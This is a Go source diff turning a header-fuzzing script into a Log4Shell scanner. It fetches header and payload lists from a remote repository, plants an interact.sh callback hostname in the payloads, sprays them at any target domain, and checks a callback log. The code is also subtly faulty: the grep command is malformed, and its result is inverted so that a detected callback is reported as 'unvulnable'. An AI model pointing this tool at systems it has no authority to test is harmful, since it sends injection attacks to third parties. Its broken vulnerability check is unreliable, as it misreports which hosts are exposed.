@@ -1,18 +1,25 @@
 package main
 
-import(
-	"fmt"
-	"net/http"
-	"crypto/tls"
-	"time"
-	"net"
-	"sync"
-	"os"
+import (
 	"bufio"
+	"bytes"
+	"crypto/tls"
 	"flag"
+	"fmt"
+	"io"
 	"log"
+	cnnfirebase "log4j-fuzzing/firebase"
+	"math/rand"
+	"net"
+	"net/http"
 	"net/http/httputil"
+	"os/exec"
+	"strconv"
+	"strings"
+	"time"
 )
+
+var total_requests = 1
 
 var httpClient = &http.Client{
 	Transport: transport,
@@ -27,101 +34,138 @@ var transport = &http.Transport{
 	}).DialContext,
 }
 
-
-func main() {
-	var headers string
-	var payloads string
-	flag.StringVar(&headers, "hf" , "" , "Set the headers file")
-	flag.StringVar(&payloads, "p" , "" , "Set the payload file")
-	flag.Parse()
-
-	var urls []string
-
-	sc := bufio.NewScanner(os.Stdin)
-	for sc.Scan() {
-		urls = append(urls, sc.Text())
+func UrlToLines(url string) ([]string, error) {
+	resp, err := http.Get(url)
+	if err != nil {
+		return nil, err
 	}
-	if err := sc.Err(); err != nil {
-		fmt.Fprintf(os.Stderr, "failed to read input: %s\n")
-	}
-	results := make(chan string)
-
-	var wg sync.WaitGroup
-	for _, url := range urls {
-		wg.Add(1)
-		go func(url string) {
-			request(url, headers , payloads)
-			defer wg.Done()
-		}(url)
-	}
-	wg.Wait()
-	close(results)
+	defer resp.Body.Close()
+	return LinesFromReader(resp.Body)
 }
-func request(urls string , headers string , payloads string) {
 
-	file , err := os.Open(headers)
+func LinesFromReader(r io.Reader) ([]string, error) {
+	var lines []string
+	scanner := bufio.NewScanner(r)
+	for scanner.Scan() {
+		lines = append(lines, scanner.Text())
+	}
+	if err := scanner.Err(); err != nil {
+		return nil, err
+	}
+
+	return lines, nil
+}
+
+func randomNumb() int {
+	rand.Seed(time.Now().UnixNano())
+	return rand.Intn(10000000000)
+}
+
+func checkVulnFromCallBack(num int) string {
+	var stdout bytes.Buffer
+	cmd := exec.Command("grep ", strconv.Itoa(num), " /root/log-log4j/log-log4j-fuzzing.txt")
+	cmd.Stdout = &stdout
+	err := cmd.Run()
 
 	if err != nil {
-		log.Fatal("File could not be read")
+		log.Fatal(err)
 	}
-	
-	defer file.Close()
-
-	time.Sleep(time.Millisecond * 10)
-
-	hScanner := bufio.NewScanner(file)
-
-	var lines []string
-	for hScanner.Scan() {
-		lines = append(lines, hScanner.Text())
+	if stdout.String() != "" {
+		return "unvulnable"
 	}
+	return "vulnable"
+}
 
-	if err := hScanner.Err(); err != nil {
-		fmt.Fprintf(os.Stderr, "failed to read input: %s\n")
-	}
+func main() {
+	var d string
+	var headers []string
+	var payloads []string
+	var err error
+	flag.StringVar(&d, "d", "", "Set domain/IP")
+	flag.Parse()
 
-	payload_file , err := os.Open(payloads)
-
-	if err !=nil {
-		log.Fatal("File could not be read")
-	}
-
-	defer payload_file.Close()
-
-	time.Sleep(time.Millisecond * 10)
-	pScanner := bufio.NewScanner(payload_file)
-
-	var links []string
-	for pScanner.Scan() {
-		links = append(links, pScanner.Text())
+	f := flag.NFlag()
+	if f != 1 {
+		fmt.Printf("Usage: log4j-fuzzing -d domain/IP\n")
+		fmt.Printf("Example: log4j-fuzzing -d http://google.com\n")
+		fmt.Printf("Example1: log4j-fuzzing -d \"http://google.com:8000\"\n")
+		fmt.Printf("Using quote if have port")
+		return
 	}
 
-	if err := pScanner.Err(); err != nil {
-		fmt.Fprintf(os.Stderr, "failed to read input: %s\n")
+	if !strings.Contains(d, "http://") && !strings.Contains(d, "https://") {
+		fmt.Printf("Must include http:// and https:// in domains")
+		return
+	}
+	//headers INPUT from url
+	headers, err = UrlToLines("https://raw.githubusercontent.com/tranquac/log4j-fuzzing/master/headers.txt")
+	if err != nil {
+		fmt.Print(err)
+	}
+	//payloads input from url
+	payloads, err = UrlToLines("https://raw.githubusercontent.com/tranquac/log4j-fuzzing/master/payloads.txt")
+	if err != nil {
+		fmt.Print(err)
 	}
 
-	for _, header := range lines {
-		for _, payload := range links {
-			req, err:= http.NewRequest("GET" , urls , nil)
-			req.Header.Add("User-Agent", "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")
-			req.Header.Add(header,payload)
-			fmt.Printf("[+] Testing: \t %s\n",header)
+	var payloads2 []string
+	num := randomNumb()
+	randN := strconv.Itoa(num)
+	hostname := randN + "." + "c7239qu1nmiqrhnc9lqgc8ndj5yyyyyyn.interact.sh"
+	for _, payload := range payloads {
+		payload := strings.Replace(payload, "hostname", hostname, -1)
+		payloads2 = append(payloads2, payload)
+	}
 
+	fmt.Println(headers)
+	fmt.Print(payloads2)
+
+	request(d, headers, payloads2)
+
+	checkVuln := checkVulnFromCallBack(num)
+
+	test := cnnfirebase.Log4j{
+		Domain: d,
+		Result: checkVuln,
+		Time:   time.Now(),
+	}
+
+	cnnfirebase.InsertData(&test)
+	abc := cnnfirebase.GetData()
+	for _, v := range abc {
+		fmt.Println(string(v))
+	}
+}
+
+func request(urls string, headers []string, payloads []string) {
+	for _, header := range headers {
+		for _, payload := range payloads {
+			req, err := http.NewRequest("GET", urls, nil)
+			if err != nil {
+				fmt.Println(err)
+			}
+			req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")
+			req.Header.Add(header, payload)
+			fmt.Printf("[+] Testing: \t %s\n", header)
+			fmt.Printf("[+] Request number: \t %d\n", total_requests)
+			total_requests += 1
 			if err != nil {
 				return
 			}
 			resp, err := httpClient.Do(req)
 			if err != nil {
+				fmt.Println(err)
 				return
 			}
 
-			res, err := httputil.DumpRequest(req, true)  
- 			if err != nil {  
-   				log.Fatal(err)  
-			}  
+			res, err := httputil.DumpRequest(req, true)
+			if err != nil {
+				log.Fatal(err)
+			}
 			fmt.Print(string(res))
 			fmt.Println(resp.StatusCode)
-			}
 		}
-	
+
+	}
+
 }
